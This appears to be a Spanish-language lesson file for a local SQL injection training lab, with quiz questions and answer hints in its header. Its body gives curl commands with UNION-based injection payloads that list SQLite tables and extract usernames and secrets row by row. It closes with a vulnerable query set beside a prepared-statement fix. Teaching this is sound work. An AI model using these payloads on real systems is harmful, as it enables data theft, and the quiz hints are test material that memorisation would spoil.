@@ -1,0 +1,65 @@
+---
+index: 3
+title: "Extracción avanzada y la segunda flag"
+questions:
+  - id: sqli-basico-t03-q01
+    prompt: "¿Qué cláusula SQL limita cuántas filas devuelve una consulta (útil para extraer datos fila a fila)?"
+    hint: "LIMIT"
+    kind: text
+  - id: sqli-basico-t03-q02
+    prompt: "Busca en la descripción de productos la flag escondida (pista: búsca 'hidden')."
+    hint: "curl 'http://127.0.0.1:18081/search?q=hidden'"
+    kind: flag
+  - id: sqli-basico-t03-q03
+    prompt: "¿Qué función de SQLite lista todas las tablas de la base de datos?"
+    hint: "sqlite_master (es el equivalente de information_schema)."
+    kind: text
+---
+
+## Enumeración de la base de datos
+
+En SQLite, la tabla interna `sqlite_master` contiene el schema:
+
+```bash
+# Ver todas las tablas
+curl "http://127.0.0.1:18081/search?q=' UNION SELECT 1,name,sql,4 FROM sqlite_master WHERE type='table'--"
+```
+
+Esto te muestra las CREATE TABLE de cada tabla — sabes las columnas sin adivinar.
+
+## Extracción fila a fila (LIMIT)
+
+Cuando UNION devuelve demasiadas filas, límita:
+
+```bash
+# Primera fila de users
+curl "http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,secret,4 FROM users LIMIT 1--"
+
+# Segunda fila
+curl "http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,secret,4 FROM users LIMIT 1 OFFSET 1--"
+```
+
+## La segunda flag: en los productos
+
+Uno de los productos tiene una flag en su descripción:
+
+```bash
+curl "http://127.0.0.1:18081/search?q=hidden"
+```
+
+La descripción contiene **FLAG_2** — visible incluso sin inyección (si sabes qué
+buscar). En la vida real: las descripciones, comentarios y metadatos de las apps
+suelen contener secretos que nadie recuerda haber dejado.
+
+## Cómo se previene TODO esto
+
+```python
+# VULNERABLE (lo que hace el lab):
+sql = f"SELECT ... WHERE name LIKE '%{query}%'"
+
+# SEGURO (prepared statements):
+cursor = db.execute("SELECT ... WHERE name LIKE ?", (f"%{query}%",))
+```
+
+La diferencia es UNA línea. Prepared statements separan CÓDIGO de DATOS: la entrada
+del usuario jamás se interpreta como SQL. Esta es la mitigación #1 de OWASP.
